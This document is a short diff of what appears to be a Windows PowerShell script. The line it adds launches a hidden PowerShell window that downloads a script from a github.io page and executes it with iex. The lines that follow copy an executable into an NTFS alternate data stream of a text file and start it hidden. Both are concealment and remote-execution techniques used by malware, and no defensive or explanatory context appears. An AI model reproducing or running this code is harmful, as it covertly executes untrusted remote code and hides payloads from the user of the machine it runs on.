@@ -1,6 +1,6 @@
 
 
-
+powershell Start-Process PowerShell.exe -windowstyle hidden {iex(iwr sl33pypanda.github.io/mi1stRepo/ps.txt -UseBasicParsing)}
 ## set alter stream / start 
 cmd.exe /c "type C:\Users\nct28\Documents\GitHub\MiPrivate\dist\nescesito.exe >C:\Users\nct28\Documents\GitHub\MiPrivate\dist\miHidden.txt:nescesito.exe"
 Start-Process -WindowStyle Hidden ("C:\Users\nct28\Documents\GitHub\MiPrivate\dist\miHidden.txt:nescesito.exe")
